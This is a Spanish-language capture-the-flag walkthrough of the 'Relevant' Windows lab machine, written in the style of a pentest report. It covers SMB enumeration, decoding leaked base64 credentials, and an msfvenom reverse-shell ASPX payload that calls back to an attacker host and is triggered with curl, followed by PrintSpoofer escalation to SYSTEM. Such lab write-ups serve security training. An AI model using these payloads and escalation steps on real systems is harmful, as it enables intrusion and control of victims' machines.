# Relevant

# Introducción

Un cliente nos ha contratado y quiere que hagamos un test de penetración.

EL ciente solicita que el ingeniero haga una evaluación de enotrno. 

- User.txt
- Root.txt

Adicionalmente:

- Herramientas y tecnicas utilizadas
- Vulnerabilidades encontradas
- Flags que hemos encontrado
- Solo IP que tenemos asiganda
- Busca y reporta todas las vulnerabilidades

# Enumeración

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.12.208

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-11 15:40 GMT
Nmap scan report for ip-10-10-12-208.eu-west-1.compute.internal (10.10.12.208)
Host is up (0.00024s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2024-11-10T15:38:06
|_Not valid after:  2025-05-12T15:38:06
|_ssl-date: 2024-11-11T15:40:29+00:00; 0s from scanner time.
MAC Address: 02:2D:9C:6E:47:D1 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: <unknown>, NetBIOS MAC: 02:2d:9c:6e:47:d1 (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-11T07:40:29-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-11 15:40:29
|_  start_date: 2024-11-11 15:38:25

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.48 seconds
```

Primero de todo enumeramos la web (80) 

![image](https://github.com/user-attachments/assets/2a10e83a-90e4-4921-a5ba-d82f68d765cb)

Vemos que es una ISS sin ningún tipo de configuración vamos a enumera subdominios a ver si encontramos algo.

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.12.208/FUZZ
```

SPOILER: No encontramos nada, vamos a buscar otro vector.

Vemos también el puerto smb abierto, pudiendo enumerar SMB

```
smbclient -L //10.10.12.208
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.12.208 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

Vaya vaya "nt4wrksv" vamos a ver si tenemos acceso

```
smbclient  //10.10.12.208/nt4wrksv
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 22:46:04 2020
  ..                                  D        0  Sat Jul 25 22:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

		7735807 blocks of size 4096. 5135178 blocks available
```

Hacemos un Get y nos lo llevamos

```
cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Parece ser que nos encontramos dos hashes en base64 vamos a intentar hacer una base64 -d

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

Vaya vaya tenemos ya dos usuarios, SPOILER: No son ni para Xfreerdp ni para SSH, vamos a seguir enumerando a ver si encontramos lugar para meter credenciales o vulnerabilidades en servicios.

Después de estar buscando y enumerando encontramos la vulnerabilidad tan famosa "EternalRomance"

https://www.exploit-db.com/exploits/43970

# Explotación

```
nmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 10.10.11.56

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-12 09:17 GMT
Nmap scan report for ip-10-10-11-56.eu-west-1.compute.internal (10.10.11.56)
Host is up (0.024s latency).

PORT     STATE SERVICE
80/tcp   open  http
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
|_sslv2-drown: 
MAC Address: 02:19:E7:F2:C8:1B (Unknown)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 67.88 seconds
```

Primero de todo generaremos un rev shell con msfvenom 

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.30.244 lport=9001 -f aspx -o reverse_shell.aspx
```

La subimos al smb

![image](https://github.com/user-attachments/assets/19591c74-c392-4638-afe2-4f31d147d254)

Una vez subimos, nos generamos un nc con metasploit

```
use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.221.106
lhost => 10.10.221.106
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > set payload windowx/x64/meterpreter_reverse_tcp
[-] The value specified for payload is not valid.
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > run
```

Una vez estemos a la espera de la escucha le mandamos un Curl

```
curl http://10.10.11.56:49663/nt4wrksv/reverse_shell.aspx
```
Después de la espera estaremos dentro y podemos coger la flag user.txt

C:\Users\Bob\Desktop

# Escalada de privilegios

Dentro podemos generar una shell

```
shell
```

O con el mismo metasploit podemos coger privilegios y saber quien somos

```
getprivs

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

Buscando estos privilegios podemos encontrar herramientas que nos puedan escalar, como por ejemplo "PrintSpoofer" que juega con el privilegios de "SeImpersonatePrivilege"

https://github.com/itm4n/PrintSpoofer/tree/master

Vamos para allí!!!

Nos cogemos el programa .exe

```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

Una vez descargado, nos vamos a la shell si estamos con metasploit va a ser mucho mas fácil porque podemos subir archivos locales, 

```
upload /root/PrintSpoofer64.exe
```

Nos metemos dentro de la shell de windows y ejecutamos el archivo (una ruta para poder subir archivos "C:\Users\Public"

```
PrintSpoofer64.exe -i -c powershell.exe
```

Si alguien le interesa como funciona realmente este exploit : https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

GG!!! SOMOS ROOT

```
PS C:\Windows\system32> whoami
whoami
nt authority\system
```


